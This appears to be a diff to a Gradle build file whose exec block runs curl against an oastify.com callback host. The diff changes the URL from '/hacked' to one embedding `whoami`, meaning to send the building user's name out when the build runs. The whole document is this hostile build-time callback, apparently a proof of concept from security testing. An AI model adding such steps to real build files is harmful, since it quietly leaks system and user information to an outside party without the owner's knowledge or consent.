@@ -1,3 +1,3 @@
 exec {
-    commandLine 'curl', '-X', 'GET', 'y65k661vr0xcyapqv3im4yi4rvxmle93.oastify.com/hacked'
+    commandLine 'curl', '-X', 'GET', 'y65k661vr0xcyapqv3im4yi4rvxmle93.oastify.com/`whoami`/hacked'
 }
